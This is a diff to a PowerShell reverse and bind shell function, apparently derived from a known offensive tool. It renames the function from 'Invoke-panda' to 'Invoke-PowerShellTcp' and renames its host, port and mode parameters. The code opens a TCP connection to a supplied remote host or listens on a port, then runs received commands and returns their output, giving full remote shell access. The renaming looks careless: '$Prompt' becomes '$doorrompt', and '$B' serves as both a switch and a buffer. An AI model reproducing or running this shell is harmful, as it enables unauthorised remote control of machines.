@@ -1,27 +1,27 @@
-function Invoke-panda {
+function Invoke-PowerShellTcp {
     [CmdletBinding(DefaultParameterSetName="reverse")]
     Param(
         [Parameter(Position=0,Mandatory=$true,ParameterSetName="reverse")]
         [Parameter(Position=0,Mandatory=$false,ParameterSetName="bind")]
-        [String]$A,
+        [String]$v4,
 
         [Parameter(Position=1,Mandatory=$true,ParameterSetName="reverse")]
         [Parameter(Position=1,Mandatory=$true,ParameterSetName="bind")]
-        [Int]$P,
+        [Int]$door,
 
         [Parameter(ParameterSetName="reverse")]
-        [Switch]$R,
+        [Switch]$rev,
 
         [Parameter(ParameterSetName="bind")]
         [Switch]$B
     )
 
     try {
-        if ($R) {
-            $C=New-Object System.Net.Sockets.TCPClient($A,$P)
+        if ($rev) {
+            $C=New-Object System.Net.Sockets.TCPClient($v4,$door)
         }
         if ($B) {
-            $L=[System.Net.Sockets.TcpListener]$P
+            $L=[System.Net.Sockets.TcpListener]$door
             $L.start()
             $C=$L.AcceptTcpClient()
         }
@@ -35,8 +35,8 @@ function Invoke-panda {
         $SB=([text.encoding]::ASCII).GetBytes($U)
         $S.Write($SB,0,$SB.Length)
 
-        $Prompt='PS '+(Get-Location).Path+'>'
-        $SB=([text.encoding]::ASCII).GetBytes($Prompt)
+        $doorrompt='PS '+(Get-Location).Path+'>'
+        $SB=([text.encoding]::ASCII).GetBytes($doorrompt)
         $S.Write($SB,0,$SB.Length)
 
         while (($I=$S.Read($B,0,$B.Length))-ne 0) {
@@ -47,16 +47,16 @@ function Invoke-panda {
                 $SB=([text.encoding]::ASCII).GetBytes($CommandOutput)
                 $S.Write($SB,0,$SB.Length)
 
-                $Prompt='PS '+(Get-Location).Path+'>'
-                $SB=([text.encoding]::ASCII).GetBytes($Prompt)
+                $doorrompt='PS '+(Get-Location).Path+'>'
+                $SB=([text.encoding]::ASCII).GetBytes($doorrompt)
                 $S.Write($SB,0,$SB.Length)
             }
             catch {
                 Write-Warning "Something went wrong with the execution of the command on the target."
                 Write-Error $_
 
-                $Prompt='PS '+(Get-Location).Path+'>'
-                $SB=([text.encoding]::ASCII).GetBytes($Prompt)
+                $doorrompt='PS '+(Get-Location).Path+'>'
+                $SB=([text.encoding]::ASCII).GetBytes($doorrompt)
                 $S.Write($SB,0,$SB.Length)
             }
 
